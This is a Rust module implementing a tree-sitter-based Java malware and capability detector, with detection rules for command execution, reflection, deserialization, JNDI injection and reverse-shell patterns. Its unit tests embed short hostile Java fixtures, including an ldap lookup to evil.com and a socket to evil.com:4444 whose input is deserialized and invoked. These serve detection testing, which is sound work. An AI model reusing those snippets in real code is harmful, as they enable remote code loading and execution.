use crate::analyzers::Analyzer;
use crate::analyzers::{
    comment_metrics::{self, CommentStyle},
    function_metrics::{self, FunctionInfo},
    identifier_metrics, string_metrics, symbol_extraction, text_metrics,
};
use crate::types::*;
use anyhow::{Context, Result};
use std::cell::RefCell;
use std::fs;
use std::path::Path;
use tree_sitter::Parser;

/// Java analyzer using tree-sitter
pub struct JavaAnalyzer {
    parser: RefCell<Parser>,
}

impl Default for JavaAnalyzer {
    fn default() -> Self {
        Self::new()
    }
}

impl JavaAnalyzer {
    pub fn new() -> Self {
        let mut parser = Parser::new();
        parser
            .set_language(&tree_sitter_java::LANGUAGE.into())
            .unwrap();

        Self {
            parser: RefCell::new(parser),
        }
    }

    fn analyze_source(&self, file_path: &Path, content: &str) -> Result<AnalysisReport> {
        let start = std::time::Instant::now();

        // Parse the Java source
        let tree = self
            .parser
            .borrow_mut()
            .parse(content, None)
            .context("Failed to parse Java source")?;

        let root = tree.root_node();

        // Create target info
        let target = TargetInfo {
            path: file_path.display().to_string(),
            file_type: "java".to_string(),
            size_bytes: content.len() as u64,
            sha256: self.calculate_sha256(content.as_bytes()),
            architectures: None,
        };

        let mut report = AnalysisReport::new(target);

        // Add structural feature
        report.structure.push(StructuralFeature {
            id: "source/language/java".to_string(),
            desc: "Java source code".to_string(),
            evidence: vec![Evidence {
                method: "parser".to_string(),
                source: "tree-sitter-java".to_string(),
                value: "java".to_string(),
                location: Some("AST".to_string()),
            }],
        });

        // Detect capabilities and patterns
        self.detect_capabilities(&root, content.as_bytes(), &mut report);

        // Extract functions
        self.extract_functions(&root, content.as_bytes(), &mut report);

        // Extract method calls as symbols for symbol-based rule matching
        symbol_extraction::extract_symbols(
            content,
            tree_sitter_java::LANGUAGE.into(),
            &["method_invocation"],
            &mut report,
        );

        // Compute metrics for ML analysis
        let metrics = self.compute_metrics(&root, content);
        report.metrics = Some(metrics);

        report.metadata.analysis_duration_ms = start.elapsed().as_millis() as u64;
        report.metadata.tools_used = vec!["tree-sitter-java".to_string()];

        Ok(report)
    }

    fn compute_metrics(&self, root: &tree_sitter::Node, content: &str) -> Metrics {
        let source = content.as_bytes();
        let total_lines = content.lines().count() as u32;

        let text = text_metrics::analyze_text(content);

        let identifiers = self.extract_identifiers(root, source);
        let ident_refs: Vec<&str> = identifiers.iter().map(|s| s.as_str()).collect();
        let identifier_metrics = identifier_metrics::analyze_identifiers(&ident_refs);

        let strings = self.extract_string_literals(root, source);
        let str_refs: Vec<&str> = strings.iter().map(|s| s.as_str()).collect();
        let string_metrics = string_metrics::analyze_strings(&str_refs);

        let comment_metrics = comment_metrics::analyze_comments(content, CommentStyle::CStyle);

        let func_infos = self.extract_function_info(root, source);
        let func_metrics = function_metrics::analyze_functions(&func_infos, total_lines);

        Metrics {
            text: Some(text),
            identifiers: Some(identifier_metrics),
            strings: Some(string_metrics),
            comments: Some(comment_metrics),
            functions: Some(func_metrics),
            ..Default::default()
        }
    }

    fn extract_identifiers(&self, root: &tree_sitter::Node, source: &[u8]) -> Vec<String> {
        let mut identifiers = Vec::new();
        let mut cursor = root.walk();
        self.walk_for_identifiers(&mut cursor, source, &mut identifiers);
        identifiers
    }

    fn walk_for_identifiers(
        &self,
        cursor: &mut tree_sitter::TreeCursor,
        source: &[u8],
        identifiers: &mut Vec<String>,
    ) {
        // Iterative traversal to avoid stack overflow on deeply nested code
        loop {
            let node = cursor.node();
            if node.kind() == "identifier" {
                if let Ok(text) = node.utf8_text(source) {
                    if !text.is_empty() {
                        identifiers.push(text.to_string());
                    }
                }
            }
            if cursor.goto_first_child() {
                continue;
            }
            if cursor.goto_next_sibling() {
                continue;
            }
            loop {
                if !cursor.goto_parent() {
                    return;
                }
                if cursor.goto_next_sibling() {
                    break;
                }
            }
        }
    }

    fn extract_string_literals(&self, root: &tree_sitter::Node, source: &[u8]) -> Vec<String> {
        let mut strings = Vec::new();
        let mut cursor = root.walk();
        self.walk_for_strings(&mut cursor, source, &mut strings);
        strings
    }

    fn walk_for_strings(
        &self,
        cursor: &mut tree_sitter::TreeCursor,
        source: &[u8],
        strings: &mut Vec<String>,
    ) {
        // Iterative traversal to avoid stack overflow on deeply nested code
        loop {
            let node = cursor.node();
            if node.kind() == "string_literal" {
                if let Ok(text) = node.utf8_text(source) {
                    let s = text.trim_start_matches('"').trim_end_matches('"');
                    if !s.is_empty() {
                        strings.push(s.to_string());
                    }
                }
            }
            if cursor.goto_first_child() {
                continue;
            }
            if cursor.goto_next_sibling() {
                continue;
            }
            loop {
                if !cursor.goto_parent() {
                    return;
                }
                if cursor.goto_next_sibling() {
                    break;
                }
            }
        }
    }

    fn extract_function_info(&self, root: &tree_sitter::Node, source: &[u8]) -> Vec<FunctionInfo> {
        let mut functions = Vec::new();
        let mut cursor = root.walk();
        self.walk_for_function_info(&mut cursor, source, &mut functions, 0);
        functions
    }

    fn walk_for_function_info(
        &self,
        cursor: &mut tree_sitter::TreeCursor,
        source: &[u8],
        functions: &mut Vec<FunctionInfo>,
        depth: u32,
    ) {
        // Iterative traversal to avoid stack overflow on deeply nested code
        let mut depth = depth;
        loop {
            let node = cursor.node();
            let kind = node.kind();

            if kind == "method_declaration" || kind == "constructor_declaration" {
                let mut info = FunctionInfo::default();
                if let Some(name_node) = node.child_by_field_name("name") {
                    if let Ok(name) = name_node.utf8_text(source) {
                        info.name = name.to_string();
                    }
                }
                // Get parameters
                if let Some(params_node) = node.child_by_field_name("parameters") {
                    let mut param_cursor = params_node.walk();
                    if param_cursor.goto_first_child() {
                        loop {
                            let param = param_cursor.node();
                            if param.kind() == "formal_parameter"
                                || param.kind() == "spread_parameter"
                            {
                                info.param_count += 1;
                                if let Some(name_node) = param.child_by_field_name("name") {
                                    if let Ok(name) = name_node.utf8_text(source) {
                                        info.param_names.push(name.to_string());
                                    }
                                }
                            }
                            if !param_cursor.goto_next_sibling() {
                                break;
                            }
                        }
                    }
                }
                info.start_line = node.start_position().row as u32;
                info.end_line = node.end_position().row as u32;
                info.line_count = info.end_line.saturating_sub(info.start_line) + 1;
                info.nesting_depth = depth;
                functions.push(info);
            }

            if cursor.goto_first_child() {
                if kind == "method_declaration" || kind == "constructor_declaration" {
                    depth += 1;
                }
                continue;
            }
            if cursor.goto_next_sibling() {
                continue;
            }
            loop {
                if !cursor.goto_parent() {
                    return;
                }
                let parent_kind = cursor.node().kind();
                if parent_kind == "method_declaration" || parent_kind == "constructor_declaration" {
                    depth = depth.saturating_sub(1);
                }
                if cursor.goto_next_sibling() {
                    break;
                }
            }
        }
    }

    fn detect_capabilities(
        &self,
        node: &tree_sitter::Node,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        let mut cursor = node.walk();
        self.walk_ast(&mut cursor, source, report);
    }

    fn walk_ast(
        &self,
        cursor: &mut tree_sitter::TreeCursor,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        // Iterative traversal to avoid stack overflow on deeply nested code
        loop {
            let node = cursor.node();

            match node.kind() {
                "method_invocation" => {
                    self.analyze_call(&node, source, report);
                }
                "import_declaration" => {
                    self.analyze_import(&node, source, report);
                }
                "object_creation_expression" => {
                    self.analyze_object_creation(&node, source, report);
                }
                _ => {}
            }

            if cursor.goto_first_child() {
                continue;
            }
            if cursor.goto_next_sibling() {
                continue;
            }
            loop {
                if !cursor.goto_parent() {
                    return;
                }
                if cursor.goto_next_sibling() {
                    break;
                }
            }
        }
    }

    fn analyze_call(&self, node: &tree_sitter::Node, source: &[u8], report: &mut AnalysisReport) {
        if let Ok(text) = node.utf8_text(source) {
            let mut capabilities = Vec::new();

            // Command execution (critical for Java)
            if text.contains("Runtime.exec") || text.contains(".exec(") {
                capabilities.push((
                    "exec/command/shell",
                    "Runtime.exec() command execution",
                    "Runtime.exec",
                    0.95,
                    Criticality::Notable,
                ));
            }

            // Reflection (major attack vector)
            if text.contains("Class.forName") {
                capabilities.push((
                    "anti-analysis/reflection",
                    "Dynamic class loading",
                    "Class.forName",
                    0.9,
                    Criticality::Notable,
                ));
            }
            if text.contains("Method.invoke") || text.contains(".invoke(") {
                capabilities.push((
                    "anti-analysis/reflection",
                    "Dynamic method invocation",
                    "Method.invoke",
                    0.95,
                    Criticality::Notable,
                ));
            }
            if text.contains(".setAccessible") {
                capabilities.push((
                    "anti-analysis/reflection",
                    "Bypass access control",
                    "setAccessible",
                    0.95,
                    Criticality::Notable,
                ));
            }
            if text.contains(".getDeclaredMethod") {
                capabilities.push((
                    "anti-analysis/reflection",
                    "Get private method",
                    "getDeclaredMethod",
                    0.9,
                    Criticality::Notable,
                ));
            }

            // Deserialization (Log4Shell-style)
            if text.contains("ObjectInputStream") || text.contains(".readObject(") {
                capabilities.push((
                    "anti-analysis/deserialization",
                    "Object deserialization",
                    "ObjectInputStream",
                    0.9,
                    Criticality::Notable,
                ));
            }
            if text.contains("XMLDecoder") {
                capabilities.push((
                    "anti-analysis/deserialization",
                    "XML deserialization",
                    "XMLDecoder",
                    0.9,
                    Criticality::Notable,
                ));
            }

            // JNDI injection (Log4Shell vector)
            if (text.contains(".lookup(") || text.contains("InitialContext"))
                && (text.contains("ldap://") || text.contains("rmi://"))
            {
                capabilities.push((
                    "jndi/injection",
                    "JNDI injection pattern",
                    "lookup+ldap/rmi",
                    0.95,
                    Criticality::Hostile,
                ));
            }

            // JNI/Native methods
            if text.contains("System.loadLibrary") || text.contains("System.load") {
                capabilities.push((
                    "exec/dylib/load",
                    "Native library loading",
                    "System.loadLibrary",
                    0.9,
                    Criticality::Notable,
                ));
            }

            // Reverse shell pattern
            if (text.contains("Socket") || text.contains("connect"))
                && (text.contains("Runtime.exec")
                    || text.contains("ProcessBuilder")
                    || text.contains("/bin/sh"))
            {
                capabilities.push((
                    "c2/reverse-shell",
                    "Reverse shell connection",
                    "Socket+exec",
                    0.98,
                    Criticality::Hostile,
                ));
            }

            // ClassLoader manipulation (supply chain risk)
            if text.contains("URLClassLoader") || text.contains(".defineClass") {
                capabilities.push((
                    "exec/classloader",
                    "Dynamic class loading",
                    "ClassLoader",
                    0.9,
                    Criticality::Notable,
                ));
            }

            // Script execution
            if text.contains("ScriptEngine") || text.contains("ScriptEngineManager") {
                capabilities.push((
                    "exec/script",
                    "Script engine execution",
                    "ScriptEngine",
                    0.9,
                    Criticality::Notable,
                ));
            }

            // Add capabilities
            for (cap_id, desc, method, conf, criticality) in capabilities {
                report.findings.push(Finding {
                    kind: FindingKind::Capability,
                    trait_refs: vec![],
                    id: cap_id.to_string(),
                    desc: desc.to_string(),
                    conf,
                    crit: criticality,
                    mbc: None,
                    attack: None,
                    evidence: vec![Evidence {
                        method: "ast".to_string(),
                        source: "tree-sitter-java".to_string(),
                        value: method.to_string(),
                        location: Some(format!(
                            "{}:{}",
                            node.start_position().row,
                            node.start_position().column
                        )),
                    }],
                });
            }
        }
    }

    fn analyze_import(&self, node: &tree_sitter::Node, source: &[u8], report: &mut AnalysisReport) {
        if let Ok(text) = node.utf8_text(source) {
            let mut capabilities = Vec::new();

            if text.contains("java.lang.Runtime") || text.contains("java.lang.ProcessBuilder") {
                capabilities.push((
                    "exec/command/shell",
                    "Process execution import",
                    "Runtime/ProcessBuilder",
                    0.8,
                    Criticality::Notable,
                ));
            }
            if text.contains("java.lang.reflect") {
                capabilities.push((
                    "anti-analysis/reflection",
                    "Reflection import",
                    "reflect",
                    0.7,
                    Criticality::Notable,
                ));
            }
            if text.contains("java.io.ObjectInputStream") {
                capabilities.push((
                    "anti-analysis/deserialization",
                    "Deserialization import",
                    "ObjectInputStream",
                    0.8,
                    Criticality::Notable,
                ));
            }
            if text.contains("javax.naming") {
                capabilities.push((
                    "jndi/import",
                    "JNDI import (injection risk)",
                    "javax.naming",
                    0.75,
                    Criticality::Notable,
                ));
            }
            if text.contains("com.thoughtworks.xstream") {
                capabilities.push((
                    "anti-analysis/deserialization",
                    "XStream deserialization",
                    "xstream",
                    0.85,
                    Criticality::Notable,
                ));
            }

            for (cap_id, desc, method, conf, criticality) in capabilities {
                report.findings.push(Finding {
                    kind: FindingKind::Capability,
                    trait_refs: vec![],
                    id: cap_id.to_string(),
                    desc: desc.to_string(),
                    conf,
                    crit: criticality,
                    mbc: None,
                    attack: None,
                    evidence: vec![Evidence {
                        method: "import".to_string(),
                        source: "tree-sitter-java".to_string(),
                        value: method.to_string(),
                        location: Some(format!(
                            "{}:{}",
                            node.start_position().row,
                            node.start_position().column
                        )),
                    }],
                });
            }
        }
    }

    fn analyze_object_creation(
        &self,
        node: &tree_sitter::Node,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        if let Ok(text) = node.utf8_text(source) {
            let mut capabilities = Vec::new();

            if text.contains("ProcessBuilder") {
                capabilities.push((
                    "exec/command/shell",
                    "ProcessBuilder creation",
                    "ProcessBuilder",
                    0.9,
                    Criticality::Notable,
                ));
            }
            if text.contains("Socket") {
                capabilities.push((
                    "net/socket/create",
                    "Socket creation",
                    "Socket",
                    0.85,
                    Criticality::Notable,
                ));
            }
            if text.contains("URLClassLoader") {
                capabilities.push((
                    "exec/classloader",
                    "URL class loader",
                    "URLClassLoader",
                    0.9,
                    Criticality::Notable,
                ));
            }

            for (cap_id, desc, method, conf, criticality) in capabilities {
                report.findings.push(Finding {
                    kind: FindingKind::Capability,
                    trait_refs: vec![],
                    id: cap_id.to_string(),
                    desc: desc.to_string(),
                    conf,
                    crit: criticality,
                    mbc: None,
                    attack: None,
                    evidence: vec![Evidence {
                        method: "ast".to_string(),
                        source: "tree-sitter-java".to_string(),
                        value: method.to_string(),
                        location: Some(format!(
                            "{}:{}",
                            node.start_position().row,
                            node.start_position().column
                        )),
                    }],
                });
            }
        }
    }

    fn extract_functions(
        &self,
        node: &tree_sitter::Node,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        let mut cursor = node.walk();
        self.walk_for_functions(&mut cursor, source, report);
    }

    fn walk_for_functions(
        &self,
        cursor: &mut tree_sitter::TreeCursor,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        // Iterative traversal to avoid stack overflow on deeply nested code
        loop {
            let node = cursor.node();

            if node.kind() == "method_declaration" {
                if let Ok(text) = node.utf8_text(source) {
                    // Extract method name
                    let name = self
                        .extract_function_name(&node, source)
                        .unwrap_or_else(|| "anonymous".to_string());

                    // Check for native methods
                    if text.contains("native ") {
                        report.findings.push(Finding {
                            kind: FindingKind::Capability,
                            trait_refs: vec![],
                            id: "jni/native-method".to_string(),
                            desc: format!("Native method: {}", name),
                            conf: 0.95,
                            crit: Criticality::Notable,

                            mbc: None,

                            attack: None,

                            evidence: vec![Evidence {
                                method: "ast".to_string(),
                                source: "tree-sitter-java".to_string(),
                                value: "native".to_string(),
                                location: Some(format!(
                                    "{}:{}",
                                    node.start_position().row,
                                    node.start_position().column
                                )),
                            }],
                        });
                    }

                    report.functions.push(Function {
                        name,
                        offset: Some(format!("0x{:x}", node.start_byte())),
                        size: Some((node.end_byte() - node.start_byte()) as u64),
                        complexity: None,
                        calls: Vec::new(),
                        source: "tree-sitter-java".to_string(),
                        control_flow: None,
                        instruction_analysis: None,
                        register_usage: None,
                        constants: Vec::new(),
                        properties: None,
                        signature: None,
                        nesting: None,
                        call_patterns: None,
                    });
                }
            }

            if cursor.goto_first_child() {
                continue;
            }
            if cursor.goto_next_sibling() {
                continue;
            }
            loop {
                if !cursor.goto_parent() {
                    return;
                }
                if cursor.goto_next_sibling() {
                    break;
                }
            }
        }
    }

    fn extract_function_name(&self, node: &tree_sitter::Node, source: &[u8]) -> Option<String> {
        let mut cursor = node.walk();
        if cursor.goto_first_child() {
            loop {
                let child = cursor.node();
                if child.kind() == "identifier" {
                    return child.utf8_text(source).ok().map(|s| s.to_string());
                }
                if !cursor.goto_next_sibling() {
                    break;
                }
            }
        }
        None
    }

    fn calculate_sha256(&self, data: &[u8]) -> String {
        use sha2::{Digest, Sha256};
        let mut hasher = Sha256::new();
        hasher.update(data);
        format!("{:x}", hasher.finalize())
    }
}

impl Analyzer for JavaAnalyzer {
    fn analyze(&self, file_path: &Path) -> Result<AnalysisReport> {
        let bytes = fs::read(file_path).context("Failed to read Java file")?;
        let content = String::from_utf8_lossy(&bytes);
        self.analyze_source(file_path, &content)
    }

    fn can_analyze(&self, file_path: &Path) -> bool {
        file_path.extension().and_then(|e| e.to_str()) == Some("java")
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    fn analyze_java_code(code: &str) -> AnalysisReport {
        let analyzer = JavaAnalyzer::new();
        let path = PathBuf::from("test.java");
        analyzer.analyze_source(&path, code).unwrap()
    }

    #[test]
    fn test_can_analyze_java_extension() {
        let analyzer = JavaAnalyzer::new();
        assert!(analyzer.can_analyze(&PathBuf::from("test.java")));
        assert!(analyzer.can_analyze(&PathBuf::from("/path/to/Main.java")));
    }

    #[test]
    fn test_cannot_analyze_other_extension() {
        let analyzer = JavaAnalyzer::new();
        assert!(!analyzer.can_analyze(&PathBuf::from("test.class")));
        assert!(!analyzer.can_analyze(&PathBuf::from("test.jar")));
    }

    #[test]
    fn test_structural_feature() {
        let code = r#"
public class Test {
    public static void main(String[] args) {
        System.out.println("Hello");
    }
}
"#;
        let report = analyze_java_code(code);
        assert!(report
            .structure
            .iter()
            .any(|s| s.id == "source/language/java"));
    }

    #[test]
    fn test_detect_runtime_exec() {
        let code = r#"
import java.io.IOException;
public class Exec {
    public void runCommand() throws IOException {
        Runtime.getRuntime().exec("whoami");
    }
}
"#;
        let report = analyze_java_code(code);
        assert!(report.findings.iter().any(|c| c.id == "exec/command/shell"));
        assert!(report
            .findings
            .iter()
            .filter(|c| c.id == "exec/command/shell")
            .any(|c| c.conf >= 0.9));
    }

    #[test]
    fn test_detect_processbuilder_creation() {
        let code = r#"
import java.io.IOException;
public class PB {
    public void run() throws IOException {
        new ProcessBuilder("ls", "-la").start();
    }
}
"#;
        let report = analyze_java_code(code);
        assert!(report.findings.iter().any(|c| c.id == "exec/command/shell"));
    }

    #[test]
    fn test_detect_reflection_class_forname() {
        let code = r#"
public class Reflect {
    public void load() throws Exception {
        Class.forName("com.evil.Payload").newInstance();
    }
}
"#;
        let report = analyze_java_code(code);
        assert!(report
            .findings
            .iter()
            .any(|c| c.id == "anti-analysis/reflection"));
    }

    #[test]
    fn test_detect_reflection_method_invoke() {
        let code = r#"
import java.lang.reflect.Method;
public class Invoke {
    public void call() throws Exception {
        Method method = obj.getClass().getMethod("exec");
        method.invoke(obj, args);
    }
}
"#;
        let report = analyze_java_code(code);
        assert!(report
            .findings
            .iter()
            .any(|c| c.id == "anti-analysis/reflection"));
    }

    #[test]
    fn test_detect_reflection_setaccessible() {
        let code = r#"
import java.lang.reflect.Field;
public class Access {
    public void bypass() throws Exception {
        Field field = clazz.getDeclaredField("privateField");
        field.setAccessible(true);
    }
}
"#;
        let report = analyze_java_code(code);
        assert!(report
            .findings
            .iter()
            .any(|c| c.id == "anti-analysis/reflection"));
    }

    #[test]
    fn test_detect_deserialization() {
        let code = r#"
import java.io.ObjectInputStream;
public class Deserial {
    public Object load(InputStream in) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(in);
        return ois.readObject();
    }
}
"#;
        let report = analyze_java_code(code);
        assert!(report
            .findings
            .iter()
            .any(|c| c.id == "anti-analysis/deserialization"));
    }

    #[test]
    fn test_detect_xmldecoder() {
        let code = r#"
import java.beans.XMLDecoder;
public class XmlD {
    public void parse() {
        XMLDecoder decoder = new XMLDecoder(in);
        decoder.readObject();
    }
}
"#;
        let report = analyze_java_code(code);
        assert!(report
            .findings
            .iter()
            .any(|c| c.id == "anti-analysis/deserialization"));
    }

    #[test]
    fn test_detect_jndi_injection() {
        let code = r#"
import javax.naming.InitialContext;
public class JNDI {
    public void exploit() throws Exception {
        InitialContext ctx = new InitialContext();
        ctx.lookup("ldap://evil.com/Exploit");
    }
}
"#;
        let report = analyze_java_code(code);
        assert!(report.findings.iter().any(|c| c.id == "jndi/injection"));
    }

    #[test]
    fn test_detect_native_library_load() {
        let code = r#"
public class Native {
    static {
        System.loadLibrary("evil");
    }
}
"#;
        let report = analyze_java_code(code);
        assert!(report.findings.iter().any(|c| c.id == "exec/dylib/load"));
    }

    #[test]
    fn test_detect_urlclassloader() {
        let code = r#"
import java.net.URLClassLoader;
public class Loader {
    public void load() throws Exception {
        URLClassLoader loader = new URLClassLoader(urls);
        Class clazz = loader.loadClass("Evil");
    }
}
"#;
        let report = analyze_java_code(code);
        assert!(report.findings.iter().any(|c| c.id == "exec/classloader"));
    }

    #[test]
    fn test_detect_script_engine() {
        let code = r#"
public class Script {
    public void run() throws Exception {
        Object engine = getScriptEngineManager().getEngine();
    }
}
"#;
        let report = analyze_java_code(code);
        assert!(report.findings.iter().any(|c| c.id == "exec/script"));
    }

    #[test]
    fn test_detect_socket_creation() {
        let code = r#"
import java.net.Socket;
public class Network {
    public void connect() throws Exception {
        Socket socket = new Socket("evil.com", 4444);
    }
}
"#;
        let report = analyze_java_code(code);
        assert!(report.findings.iter().any(|c| c.id == "net/socket/create"));
    }

    #[test]
    fn test_detect_native_method() {
        let code = r#"
public class JNI {
    public native void executeShellcode(byte[] code);

    static {
        System.loadLibrary("malware");
    }
}
"#;
        let report = analyze_java_code(code);
        assert!(report.findings.iter().any(|c| c.id == "jni/native-method"));
    }

    #[test]
    fn test_extract_methods() {
        let code = r#"
public class Methods {
    public void method1() {
    }

    private int method2(String arg) {
        return 0;
    }
}
"#;
        let report = analyze_java_code(code);
        assert_eq!(report.functions.len(), 2);
        assert!(report.functions.iter().any(|f| f.name == "method1"));
        assert!(report.functions.iter().any(|f| f.name == "method2"));
    }

    #[test]
    fn test_import_reflection_package() {
        let code = r#"
import java.lang.reflect.Method;
public class Test {
}
"#;
        let report = analyze_java_code(code);
        assert!(report
            .findings
            .iter()
            .any(|c| c.id == "anti-analysis/reflection"));
    }

    #[test]
    fn test_import_jndi_package() {
        let code = r#"
import javax.naming.InitialContext;
public class Test {
}
"#;
        let report = analyze_java_code(code);
        assert!(report.findings.iter().any(|c| c.id == "jndi/import"));
    }

    #[test]
    fn test_multiple_capabilities() {
        let code = r#"
import java.lang.reflect.Method;
import java.io.ObjectInputStream;
import java.net.Socket;
public class MultiThreat {
    public void exploit() throws Exception {
        Socket s = new Socket("evil.com", 4444);
        ObjectInputStream ois = new ObjectInputStream(s.getInputStream());
        Object payload = ois.readObject();
        Method m = payload.getClass().getMethod("exec");
        m.invoke(payload);
    }
}
"#;
        let report = analyze_java_code(code);
        assert!(report.findings.iter().any(|c| c.id == "net/socket/create"));
        assert!(report
            .findings
            .iter()
            .any(|c| c.id == "anti-analysis/deserialization"));
        assert!(report
            .findings
            .iter()
            .any(|c| c.id == "anti-analysis/reflection"));
        assert!(report.findings.len() >= 3);
    }
}
